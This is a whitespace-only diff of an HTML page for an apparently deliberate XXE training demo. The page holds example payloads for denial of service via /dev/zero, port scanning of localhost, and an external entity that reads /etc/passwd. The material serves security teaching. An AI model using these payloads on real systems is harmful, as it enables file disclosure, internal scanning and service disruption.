@@ -1,31 +1,31 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<title>XML Entity Injection</title>
-	</head>
-	<body>
-		<h1>XML Entity Injection</h1>
-		<p>(XML External Entity Processing - XXE)</p>
-		<h2>Enter XML:</h2>
-		<form method="POST" action="xxe.php">
-			<textarea name="xml" id="xml" cols="80" rows="24"></textarea><br/>
-			<input type="submit"/>
-		</form>
-		<h2>Example documents:</h2>
-		<h3>DoS (TODO: needs fixing)</h3>
-		<pre>
+  <head>
+    <title>XML Entity Injection</title>
+  </head>
+  <body>
+    <h1>XML Entity Injection</h1>
+    <p>(XML External Entity Processing - XXE)</p>
+    <h2>Enter XML:</h2>
+    <form method="POST" action="xxe.php">
+      <textarea name="xml" id="xml" cols="80" rows="24"></textarea><br/>
+      <input type="submit"/>
+    </form>
+    <h2>Example documents:</h2>
+    <h3>DoS (TODO: needs fixing)</h3>
+    <pre>
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE sample PUBLIC "..." "/dev/zero"&gt;
 &lt;empty/&gt;
-		</pre>
-		<h3>Port Scanning</h3>
-		<pre>
+    </pre>
+    <h3>Port Scanning</h3>
+    <pre>
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE sample PUBLIC "..." "http://localhost:99"&gt;
 &lt;empty/&gt;
-		</pre>
-		<h3>File Inclusion</h3>
-		<pre>
+    </pre>
+    <h3>File Inclusion</h3>
+    <pre>
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE request [
   &lt;!ENTITY include SYSTEM "/etc/passwd"&gt;
@@ -33,6 +33,6 @@
 &lt;request&gt;
   &lt;description&gt;&amp;include;&lt;/description&gt;
 &lt;/request&gt;
-		</pre>
-	</body>
+    </pre>
+  </body>
 </html>
